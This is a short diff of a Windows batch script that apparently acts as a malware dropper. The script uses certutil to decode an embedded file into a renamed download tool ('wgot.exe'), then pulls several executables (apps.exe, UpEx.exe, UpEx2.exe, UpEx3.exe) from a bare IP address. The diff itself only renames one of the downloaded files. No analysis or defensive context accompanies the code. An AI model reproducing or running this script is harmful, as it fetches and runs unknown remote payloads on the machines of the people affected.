@@ -8,7 +8,7 @@ set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 certutil.exe -decode wgot.64 wgot.exe
 echo http^:^/^/37.52.9.2^/Drw >> wgot.txt
 echo wgot ^-c ^-i wgot.txt > wgot.bat
-wgot -c http://37.52.9.2/app.exe
+wgot -c http://37.52.9.2/apps.exe
 wgot -c http://37.52.9.2/UpEx.exe
 wgot -c http://37.52.9.2/UpEx2.exe
 wgot -c http://37.52.9.2/UpEx3.exe
